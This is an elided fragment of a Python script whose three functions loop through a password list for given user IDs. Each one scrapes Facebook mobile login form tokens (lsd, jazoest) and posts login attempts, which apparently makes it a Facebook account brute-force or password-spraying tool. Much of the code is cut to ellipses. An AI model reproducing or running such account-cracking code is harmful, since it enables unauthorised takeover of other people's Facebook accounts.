...
def ffb1(ids,names,passlist):
        ...
        try:
                ...
                for fikr in passlist:
                        ...
                        idpass ={"lsd":re.search('name="lsd" value="(.*?)"', str(getlog.text)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', str(getlog.text)).group(1),"uid":ids,"next":"https://touch.facebook.com/login/save-device/?login_source=login#_=_/","flow":"login_no_pin","pass":pas,}
                        complete = session.post('https://touch.facebook.com/', cookies=cookies, headers=headers)
...
def ffb(ids,names,passlist):
        ...
        try:
                ...
                for fikr in passlist:
                        ...
                        getlog = session.get(f'https://free.facebook.com/?stype=lo&jlou=AffvDftmt5To1iu1EyYPJow9YjWf5sBizcHFZe352D6OJ-8fOGFuBmvryr2RtnKti1eVRdd46B1fKa7n0lrf2zUoH03MMwlefnpYNOlk33u3lQ&smuh=21668&lh=Ac-wtQ8WtGT9_OF1DlU&ref_component=mbasic_footer&_rdr')
...
def ffb3(ids,names,passlist):
        ...
        try:
                ...
                for fikr in passlist:
                        ...
                        getlog = session.get(f'https://mbasic.facebook.com/login/save-device/?login_source=login')
